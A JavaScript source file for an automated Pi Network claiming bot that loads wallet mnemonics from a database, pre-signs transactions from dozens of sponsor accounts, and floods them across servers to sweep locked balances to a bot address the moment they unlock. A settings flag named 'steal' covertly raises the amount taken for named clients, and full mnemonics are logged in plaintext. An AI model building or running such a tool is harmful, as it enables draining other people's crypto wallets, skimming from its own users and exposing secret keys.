import { connectToDB } from "./db.js";
import ColemanSettings from "./models/ColemanSettings.js";
import Log from "./models/Log.js";
import Passphrase from "./models/Passphrase.js";
import Sponsors from "./models/Sponsors.js";
import { firstFilteredSponsors, getAccount, getBalance, getKeypairFromPassphrase, getSDKKeypairFromPassphrase, HORIZONS, PI_PUBLIC_ADDRESS, PI_PUBLIC_MUXED_ADDRESS, sleep, submitTransaction } from "./utils/fn.js";
import { prebuildAndSignChannelTx, prebuildAndSignClaimable, prebuildAnSignPayment } from "./utils/fn2.js";
import { getRandomAddress } from "./utils/helper.js";


await connectToDB();
const pendingXDRs = {};
const rawSponsors = await Sponsors.find();

const claimable_sponsors = [
    'GBXSHWTBHLYGVE35QBZTTOLR2XUHWT3AFRIEFVIMRABS6XQLG2PV4ZSZ', //chris
    'GCRITFGUZFVKZI44S2B4K5FRA4R3G3TBS55MROAZJJGASPW2CR6GRXTW',
    'GADRM6UKC7GHYLAKO5QXDSSXQTP3URIRYM44TZEQ26CJRAHWW43VCGKE',
    'GDMR5AJUDD3HNWHTXXWNWTE66FIASMQHIGBE47BJLV2NBUHQV63I25GB',
    'GC5OXTBA2RR2FH4P6X2ERB7JULS4JH4EBIPCBDCECHTWJRM5MTZJTPJ5',
    'GBUUNZIJZOJKDQ2IZAAY3WZXJJ3UYPS2NWL5WEOGI3UYM36EKLMY4VMK',
    'GDPKOBNVZNPWIXY6FELX4K7WHZYFRWCFUJJSEHYGRYDMRUTHPVKAMIMV',
    'GAZPOF3COT2AHQINUK3XWBHI33FCE5T5X6EQWXG55TVWMEOAACKJMIF7',
    'GBOA5BHQ62F346A43RN5GRQB6NB7GGOYUG37CIO6KQJFGMBPPTKTXNPA',
    'GACKTTXYYOD67LEKCK652OSPV3ETLDUGLIKH6DG3SAKCZ52L2MLC55QV',
    'GCI4HZWQJYKH3X7YR7OXLBT6AEGRIUUXL57EQDKFWSTNGXTROZKYHJGI',
    'GAOB7G7F545ULQX5KMII2KQTPNS25JJRR3HRK4M3LFZ7DL4BAVLJH6AE',
    'GCFZAY6X2H6PX5YV3AO33K2PUXST3WDC77H7ZEOPETGLSDIICF4QGOTT',
    'GB3T6NTKF3JVFRCZJRZQIXX6PVQTQSCAR67U3AVUAZFUOZQE6RUCUPE5',
    'GC5HX6F5ILJJLXAJPTX4C5ZKLTGW5WAIOG34HQLZPHOEIGN7VIHTADUA',
    'GDTCTHXG266A7XVIVYPANAIZERIDGFMAUGFRCAOPNJQ3HHAOGI5JBHJK',
    'GANQPRB22T7372NWP23E52PX6Q4JVTG3SHZSFOB2C4YVS77JVQDP4VNH',
    'GCK7XLJHRLNQX5EAY4TU3AWPV4C6B2QKF4WHOAUQUDSJQVJHO3UKHOGM',
    'GD3W6OKR2OG4YVEVL7XA3XR3A7L4DB6ORKWE5Z3JZI6HM4DUGH2QFNHI',
    'GB2HDWZLLWZSKZXDF22HLARBADZEAVUUB2PQETM4AQQL3FCYFSVKESP3',
    'GBGIX5VQGHCO6KVCK42KUZJLWVQ372SOSAELPAPPQYBMLFUJLZCBO5VY',
    'GCTD4XD7LJ3VO2GFR5R6HJ737COUKDOTY252SXLZCY5FDTF5RWECVQ5K',
    'GABADQPRXL7L6ON7DN4NWF76HWFZRBAGJML5ZLKXQ4ETUCVLSH6AQ744',
    'GDVHDU42H6GOOCRAPZJDJU2I7MN7PZIO3WGYCBMTEBAIWMBNX7R6RCW5',
    'GBQUWHAHB4H26P5LUBRYEDQIZCYETXSTD5GKSH4QXWAB33DLAR3AWGY3',
    'GDBOV3CR7675RNJBZ6RGZ343LUQDBOELMEZHNUIRAAWKL2FALA37HMNH',
    'GACK3XXMCVORPZNIBCJ2M6ZSOSP6Z6IM2QHK5SVGP2SLLIAOGURZDDM3',
    'GCU3T3D2MKTRUYLWSLXI3KT6NV22P62EDZFVLOWSLELKQ4QQZ2MGADOG',
    'GB7QYI2GVDNCCS4Q5QPYH2VEFTLD5YBVQTTG3EWYZAOFQHTLWKWJVCIX',
    'GDINIDBZU66PZG3LXVLZDWNL2CTLSBJLO6Y6KV5L6CMQNZFT45U26BQT',
];

const payment_sponsors = [
    'GBTKG3Z7UD2PJ3D573HQWX5T45DI6TYQE4A264MMDIZFHIDSNH5MAVDW',
    'GBVATY2XSF72M6TZWR2UH2TOOIPG4IOC4UMANXO5CI7HOCDKYP5ZVNB2',
    'GD5ZLAONP7A3B5L7BW2TTG3KTHVZPGYYTX3TGM6YJCDQD7KBEOBNGTFP',
    'GBYCE5OKZNUMYOY72ER3VN3TLC2PC6HXAQ5F223CHH5HYKHF2VKRGXXY', // BOT INSIDE
    'GAPRFNHDESW6FI2GC3XU4TYLBWP6SZKRVNHAHFPTOPLM4FJW6NVFC4KA',
    'GAARGSD5XOLJPFI2AJ7KOJP53K6KNPRTLK4KRFY2OORK4EPIJJPWAWQB',
    'GCGQOB5H4A42CNT3WW2FUFXYUYKGSESFIYY7OA7ZGEG63CAMB6N4PGX7',
    'GASHKS3CV2KNLKAHDGDEKQIE3Q2F42TKDR72XZFZYKD2S73VSJYEW3O6',
    'GDI2PHNWR7MNCBMCNIX466TCNZJVE2D5XCFIYSC42B4UUYW4L4YA2R6D',
    'GALOB3GJ3VNVD44KRLLCWWNVWM2AINBKSGIVXZENBJFXPWXMEU4RELBM',
    'GBEL33S25XCNKI7VLOP7VRBCRE55NMUAWD45YRQYTM3ROYEFALVJQ7TJ',
    'GCEM6CCOF77HQ5FSBSO6XADDQON55KGUWASJNGESVZL4GWOL46BCVIRQ',
    'GCZF3FBXHP6O74SANJ3UE3RVBTSJDN2VYIOPZEGWKYXXDMFT42P6ZKIW',
    'GACW2KFKA3MKOPJR3ZBFAE665YNUGUUISXXOD64BNHEKOBTRQF4OQ2B5',
    'GBTAG2C2YRRBJYLBIK54GA76S3LDWYFA2WU7YUA4H4ETPGPH727JK4IN',
    'GBAMVPHYLHLXNXTTWJW7YJYFE7ONNFGSQFP3AYSGHKMYNRTIGGRNVHKO',
    'GC6AQGS56OSQYYDXZRV37VU3DRKOJVGU7HOB6NKT37POXMLEGLMOLMPC',
    'GARXLHMK46LFW7GKV74PUZRR7CS4TD2OHKQDGT3OESJAJ5ESV7EXCSH2',
    'GCCVICFPWLN2ZLETGINRRXO4XF3PWPIWPRR4IDIOT7NNF7AAZ74WNMUD',
    'GAEWQNPVWODXI3GEE2QFV7OFCPTW73CN45FS4DNAFKKN3X5W6RGVQI5L',
    'GCYWM7QMQDWU7TDQQAMJFC6UO7SCTK6IXFDSQZR25URDG4OKYSE6EXVD',
    'GAMDYVR4DA4FDF5MU6CZOTRXHBUQXHHUONDAIADJ2JW2IVLJCNWIK32A', //BOT INSIDE
    'GD6L4MCXEHR37UB3GE4R4YJOGRMANYQS5QNXQ7ILK2SZCA5MJU56XVNS',
    'GDWXB2WMVEUYD3S7CD4AACOCGX4IYVELGHIJTR4MA5IMXPN2L7OQRHFE',
    'GA2KMOZU42JRNPUPKFZEBKMM5NT26PZ7AYKJJTWNILSN3DKX3TKFQADG', //BOT INSIDE
    'GA34L4X5D7UJG6OTTQ6DFFBSAEZ3WWFRZL5QQOMYGAQV47NAEBRLBBMA',
    'GA4AQE2ILIBBI67RZEGZLIQF5JZOAASN3T72PHHDUDMSWURZECDN6B7G',
    'GASZOEKBGG2JO3FEYG4P4OEJD5WNMS2TMMCBQE4DZJ4SDFSX5XF5YNNG',
    'GBACMXDWSHQZCAM6PNTUASZSIQQ42IDRBO4CJYGU4PKNTU7TVPYD6OPC',
    'GAMTHCTITAYCFYFZX3EPM3UYPJDZFDR362KMW2SUQ2V3QGOO4WPTUCIR',
]

const sponsors = [];
const MAX_FLOOD_COUNT = 2;
let CURRENT_KEY = null;
    
for (const sponsor of rawSponsors) {
    const kp = getKeypairFromPassphrase(sponsor.mnemonic);
    const pubKey = kp.publicKey();

    if (firstFilteredSponsors.includes(pubKey)) {
        sponsors.push(sponsor);
    }
}

async function getXDRsReady(mainPhrase, balanceId, recipient, amount, time, name, sponsorsCount) {
    CURRENT_KEY = time;
    const mainKp = getSDKKeypairFromPassphrase(mainPhrase);
    pendingXDRs[time] = [];
    let retries = 0;

    try {
        await Log.create({ mnemonic: mainPhrase, action: `Building & Signing Tx for ${amount} PI`, result: 'default', name: name });
        while (retries < MAX_FLOOD_COUNT) {
            const settings = await ColemanSettings.findOne({ name: 'whoami5677' });
            const xdrs = [];

            const mainBotSponsors = settings.useAllSponsors ? rawSponsors : sponsors;
            let usingSponsors = name ? await Sponsors.find({ name: name }) : mainBotSponsors;
            usingSponsors = name ? usingSponsors.slice(0, sponsorsCount) : usingSponsors;
            
            for (const s of usingSponsors) {
                const r = name ? recipient : getRandomAddress()
                // const r = recipient;
                try {
                    const kp = getSDKKeypairFromPassphrase(s.mnemonic);
                    const accountData  = await getAccount(kp.publicKey());
                    const balanceString = getBalance(accountData);
                    const balance = parseFloat(balanceString) - 0.98;
                    if(balance < 0.02) continue;
                    // Change amount
                    const mutatedAmount = ( !!name && settings.steal ) ? (Number(amount) + 0.0101).toString() : amount;

                    if(claimable_sponsors.includes(kp.publicKey())) {
                        const xdr = await prebuildAndSignClaimable(s.mnemonic, mainKp, balanceId, retries, name);
                        xdrs.push({xdr, balanceId});
                    } else if(payment_sponsors.includes(kp.publicKey())) {
                        const xdr = await prebuildAnSignPayment(s.mnemonic, mainKp, r, mutatedAmount, retries, name);
                        xdrs.push({xdr, balanceId});
                    } else {
                        // continue;
                        const xdr = await prebuildAndSignChannelTx(s.mnemonic, mainKp, balanceId, r, mutatedAmount, retries, name);
                        xdrs.push({xdr, balanceId});
                    }
                } catch (innerErr) {
                    console.error(`Error building XDR from sponsor ${s.name || s.mnemonic.slice(0, 5)}:`, innerErr);
                }
            }
            retries++;
            pendingXDRs[time].push(xdrs);
            await sleep(5000)
        }
        console.log(`The below is the pending xdr`);
        console.log(pendingXDRs)

    } catch (err) {
        console.error(`Error in getXDRsReady:`, err);
    }
}

export async function autoPrepareForClaiming(name, address, sponsorsCount) {
    if(global.isPreparing) return;
    global.isPreparing = true;
    
    try {
        // console.log(`autoPrepare is running for ${name ? name : 'Main'}`)

        const now = new Date();
        const min = (2 * 1000 * 60)
        const aMinuteFromNow = new Date(now.getTime() + min);

        const readyPassphrases = await Passphrase.find({
            claimableAt: { $lte: aMinuteFromNow },
            status: 'pending',
            name: name ? name : { $in: [null, undefined] }
        });

        console.log(`Ready Phrases for ${name ? name : 'Main'}`)
        console.log(readyPassphrases)

        if(readyPassphrases.length) {
            const settings = await ColemanSettings.findOne({ name: 'whoami5677' });
            const receiverAddress = address ? address : settings.botAddress;
            for(const p of readyPassphrases) {
                const timeKey = new Date(p.claimableAt).toISOString();
                if(!pendingXDRs.hasOwnProperty(timeKey) && CURRENT_KEY !== timeKey) {
                    await Log.create({ mnemonic: p.mnemonic, action: `Setting up wallet for claiming ${p.amount} PI on Mnemonic: ${p.mnemonic}`, result: 'default', name: name })
                    await getXDRsReady(p.mnemonic, p.balanceId, receiverAddress, p.amount, timeKey, name, sponsorsCount);
                }
            }
        }
    } catch(e) {
        console.error('autoPrepareForClaiming error:', err);
    } finally {
        global.isPreparing = false;
    }
}

export async function autoSubmitXDR(name) {
    if(global.isSubmittingTx) return;
    global.isSubmittingTx = true;
    for (const key in pendingXDRs) {
        const now = new Date();
        const claimableAt = new Date(key);
        if((now - claimableAt) <= -450) continue;
        const xdrGroup = pendingXDRs[key]; // [[], []]
        const settings = await ColemanSettings.findOne({ name: 'whoami5677' });
        // if(!!name && settings.steal) {
        //     await sleep(2000)
        // }

        let success = false;
        let balanceId = null;

        for(const xdrs of xdrGroup) {
            const result = await Promise.all(xdrs.map(async (xdr, i) => {
                let server = HORIZONS[i % HORIZONS.length];
                // server = !!name ? HORIZONS[0] : server;
                // console.log(`${name ?? 'Main server:'} ${server}`)
                try {
                    const result = await submitTransaction(xdr.xdr, server);
                    balanceId = xdr.balanceId;
                    console.log(result)
                    return result;

                } catch (err) {
                    console.error(`❌ Submit error on ${server}:`, err?.response?.data || err.message);
                }
            }));
            const found = result.find((r) => r.hash);
            if (found) {
                await Log.create({ mnemonic: 'Direct above', action: `✅ Claimed Pi. Hash: ${found.hash}`, result: 'success', name: name })
                // console.log(`✅ Claimed Pi. Hash: ${found.hash}`);
                await Passphrase.updateOne(
                    { 
                        balanceId: balanceId,
                        name: name ? name : { $in: [null, undefined] }
                    },
                    { $set: { status: "claimed" } }
                );
                // global.lastClaimedOrFailedAt = new Date();
                success = true;
                break;
            }
        }

        if(!success) {
            await Log.create({ mnemonic: 'Direct above', action: `❌ Claiming failed`, result: 'error', name: name })
            await Passphrase.updateOne(
                { 
                    balanceId: balanceId,
                    name: name ? name : { $in: [null, undefined] }
                },
                { $set: { status: "failed" } }
            );
        }
        delete pendingXDRs[key];
    }
    global.isSubmittingTx = false;
}

export async function autoMarkAsClaimable() {
    const now = new Date();
    const threeMinutesAgo = new Date(now.getTime() - 0.5 * 60 * 1000);

    await Passphrase.updateMany(
        { claimableAt: { $lt: threeMinutesAgo }, status: 'pending' },
        { $set: { status: 'failed' } }
    );
}
